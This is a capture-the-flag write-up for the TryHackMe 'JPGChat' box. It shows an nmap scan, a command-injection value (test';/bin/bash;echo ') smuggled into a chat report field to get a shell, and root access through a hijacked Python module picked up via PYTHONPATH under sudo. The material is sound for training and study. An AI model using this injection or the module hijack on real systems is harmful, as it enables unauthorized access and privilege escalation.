# THM - JPGChat

#### Ip: 10.10.110.157
#### Name: JPGChat
#### Difficulty: Easy

----------------------------------------------------------------------

jpgchat.png

### Enumeration

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. To speed this along I'll also use the `--min-rate 10000` flag:

```text
┌──(ryan㉿kali)-[~/THM/JPGChat]
└─$ sudo nmap -p-  --min-rate 10000 10.10.110.157       
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-29 12:33 CDT
Nmap scan report for 10.10.110.157
Host is up (0.13s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 9.07 seconds
```

Lets scan these ports using the `-sV` and `-sC` flags to enumerate versions and to use default Nmap scripts:

```text
┌──(ryan㉿kali)-[~/THM/JPGChat]
└─$ sudo nmap -sC -sV 10.10.110.157 -p 22,3000          
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-29 12:34 CDT
Nmap scan report for 10.10.110.157
Host is up (0.13s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fecc3e203fa2f8096f2ca3affa329c94 (RSA)
|   256 e8180cadd0635f9dbdb784b8ab7ed197 (ECDSA)
|_  256 821d6bab2d04d50b7a9beef464b57f64 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     Welcome to JPChat
|     source code of this service can be found at our admin's github
|     MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
|_    REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.93%I=7%D=8/29%Time=64EE2C24%P=aarch64-unknown-linux-gn
SF:u%r(NULL,E2,"Welcome\x20to\x20JPChat\nthe\x20source\x20code\x20of\x20th
SF:is\x20service\x20can\x20be\x20found\x20at\x20our\x20admin's\x20github\n
SF:MESSAGE\x20USAGE:\x20use\x20\[MESSAGE\]\x20to\x20message\x20the\x20\(cu
SF:rrently\)\x20only\x20channel\nREPORT\x20USAGE:\x20use\x20\[REPORT\]\x20
SF:to\x20report\x20someone\x20to\x20the\x20admins\x20\(with\x20proof\)\n")
SF:%r(GenericLines,E2,"Welcome\x20to\x20JPChat\nthe\x20source\x20code\x20o
SF:f\x20this\x20service\x20can\x20be\x20found\x20at\x20our\x20admin's\x20g
SF:ithub\nMESSAGE\x20USAGE:\x20use\x20\[MESSAGE\]\x20to\x20message\x20the\
SF:x20\(currently\)\x20only\x20channel\nREPORT\x20USAGE:\x20use\x20\[REPOR
SF:T\]\x20to\x20report\x20someone\x20to\x20the\x20admins\x20\(with\x20proo
SF:f\)\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.93 seconds
```

Going off the Nmap scan we know there is a GitHub with the source code to the chat system. A quick Google takes us to https://github.com/Mozzie-jpg/JPChat/blob/main/jpchat.py

Taking a look at the source code we see that it is using `os.system` to make bash commands. We should be able to exploit this:

code.png

### Exploitation

We can connect to the chat service using NetCat:

```text
┌──(ryan㉿kali)-[~/THM/JPGChat]
└─$ nc -nv 10.10.110.157 3000
(UNKNOWN) [10.10.110.157] 3000 (?) open
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
```

From there we can run:

```text
[REPORT]
this report will be read by Mozzie-jpg
your name:
test
your report:
test';/bin/bash;echo '
test
whoami
wes
id
uid=1001(wes) gid=1001(wes) groups=1001(wes)
```
Which is giving us interactive control via bash and echo to the target.

We can set up a NetCat listener and issue a one-liner to get a real reverse shell back:

shell.png

Now that we have a shell we can grab the user.txt flag:

user_flag.png

### Privilege Escalation

Running `sudo -l` we find that Wes can run test-module.py in the `/opt` directory and that it will keep the environment variable. 

```text
wes@ubuntu-xenial:/tmp$ sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```

Taking a look at the script we see it is importing from a module called compare:

```text
wes@ubuntu-xenial:/opt/development$ cat test_module.py
cat test_module.py
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))
```

Interesting, we may be able to hijack this by creating our own compare.py module, updating the pythonpath, and then running the script as root.

```text
wes@ubuntu-xenial:/tmp$ cat >> compare.py
import os
os.system('/bin/bash')
^C
wes@ubuntu-xenial:/tmp$ cat compare.py
import os
os.system('/bin/bash')
wes@ubuntu-xenial:/tmp$ chmod +x compare.py
wes@ubuntu-xenial:/tmp$ export PYTHONPATH=/tmp
wes@ubuntu-xenial:/tmp$ sudo /usr/bin/python3 /opt/development/test_module.py
root@ubuntu-xenial:/tmp# whoami
root
root@ubuntu-xenial:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

Nice, that worked! Lets go ahead and grab the root.txt flag:

root_flag.png

Thanks for following along!

-Ryan

------------------------------------------------------